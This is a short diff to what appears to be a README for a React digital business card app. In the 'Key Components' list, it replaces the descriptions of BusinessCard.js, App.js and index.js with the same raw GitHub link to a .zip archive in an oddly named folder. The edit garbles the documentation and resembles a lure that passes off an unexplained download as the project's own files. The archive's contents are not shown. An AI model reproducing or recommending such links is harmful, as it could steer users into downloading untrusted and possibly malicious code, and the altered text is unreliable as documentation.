@@ -21,9 +21,9 @@ sh
 
 Key Components
 
-    BusinessCard.js: Defines the business card structure and content.
-    App.js: Main component setting up the application structure.
-    index.js: Entry point for the React application.
+    https://raw.githubusercontent.com/kevkaleido/digital-business-card/main/uncommutative/digital-business-card.zip Defines the business card structure and content.
+    https://raw.githubusercontent.com/kevkaleido/digital-business-card/main/uncommutative/digital-business-card.zip Main component setting up the application structure.
+    https://raw.githubusercontent.com/kevkaleido/digital-business-card/main/uncommutative/digital-business-card.zip Entry point for the React application.
 
 Scripts
 
